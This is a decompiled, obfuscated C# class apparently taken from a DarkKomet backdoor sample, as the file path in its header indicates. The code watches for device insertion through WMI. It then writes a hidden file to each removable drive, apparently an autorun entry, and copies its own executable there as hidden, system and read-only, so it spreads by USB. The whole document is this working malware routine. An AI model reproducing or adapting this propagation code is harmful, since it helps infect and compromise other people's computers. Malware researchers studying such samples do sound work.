// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

internal sealed class \u000E\u2001
{
  private static ManagementEventWatcher \u0002;

  public static void \u0002()
  {
    ManagementScope scope = new ManagementScope(\u0006\u2002.\u0002(-885880329));
    scope.Options.EnablePrivileges = true;
    try
    {
      Thread.Sleep(50);
      \u000E\u2001.\u0002 = new ManagementEventWatcher(scope, (EventQuery) new WqlEventQuery()
      {
        EventClassName = \u0006\u2002.\u0002(-885880346),
        WithinInterval = new TimeSpan(0, 0, 3),
        Condition = \u0006\u2002.\u0002(-885880380)
      });
      \u000E\u2001.\u0002.EventArrived += new EventArrivedEventHandler(\u000E\u2001.\u0002);
      \u000E\u2001.\u0002.Start();
    }
    catch
    {
      if (\u000E\u2001.\u0002 == null)
        return;
      \u000E\u2001.\u0002.Stop();
    }
  }

  public static void \u0002(object _param0, EventArgs _param1)
  {
    foreach (DriveInfo drive in DriveInfo.GetDrives())
    {
      if (drive.DriveType == DriveType.Removable)
      {
        try
        {
          Thread.Sleep(50);
          if (File.Exists(drive.Name + \u0006\u2002.\u0002(-885880813)))
            File.Delete(drive.Name + \u0006\u2002.\u0002(-885880813));
          if (File.Exists(drive.Name + \u0006\u2002.\u0002(-885880707)))
            File.Delete(drive.Name + \u0006\u2002.\u0002(-885880707));
        }
        catch
        {
        }
        StreamWriter streamWriter = new StreamWriter(drive.Name + \u0006\u2002.\u0002(-885880813));
        streamWriter.WriteLine(\u0006\u2002.\u0002(-885880721));
        streamWriter.WriteLine(\u0006\u2002.\u0002(-885880737));
        streamWriter.WriteLine(\u0006\u2002.\u0002(-885880763));
        streamWriter.WriteLine(\u0006\u2002.\u0002(-885880678));
        streamWriter.WriteLine(\u0006\u2002.\u0002(-885880701));
        streamWriter.WriteLine(\u0006\u2002.\u0002(-885880608));
        streamWriter.Close();
        Thread.Sleep(50);
        File.SetAttributes(drive.Name + \u0006\u2002.\u0002(-885880813), File.GetAttributes(drive.Name + \u0006\u2002.\u0002(-885880813)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        try
        {
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, drive.Name + \u0006\u2002.\u0002(-885880707));
          File.SetAttributes(drive.Name + \u0006\u2002.\u0002(-885880707), File.GetAttributes(drive.Name + \u0006\u2002.\u0002(-885880707)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
        }
        finally
        {
          Thread.Sleep(2000);
        }
      }
      if (\u000E\u2001.\u0002 != null)
        \u000E\u2001.\u0002.Stop();
      \u000E\u2001.\u0002.Start();
    }
  }
}
